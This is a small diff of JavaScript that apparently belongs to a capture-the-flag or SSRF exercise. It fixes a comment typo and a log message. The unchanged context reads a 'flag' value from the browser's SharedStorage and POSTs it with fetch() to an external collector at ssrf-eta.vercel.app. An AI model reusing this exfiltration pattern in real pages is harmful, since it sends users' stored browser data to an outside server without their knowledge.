@@ -56,7 +56,7 @@
                     console.log("SharedStorage flag_test set to test_flag_value.");
                   }
 
-                  // Send the flag to https://ssrf-eta.vercel.app/api/cature
+                  // Send the flag to https://ssrf-eta.vercel.app/api/capture
                   const dataToSend = flag || "no flag yet";
                   await fetch("https://ssrf-eta.vercel.app/api/capture", {
                     method: "POST",
@@ -66,7 +66,7 @@
                     body: JSON.stringify({ flag: dataToSend })
                   });
 
-                  console.log("Flag sent to fein.");
+                  console.log("Flag sent to capture.");
                   
                 } catch (err) {
                   console.error("Error accessing sharedStorage:", err);
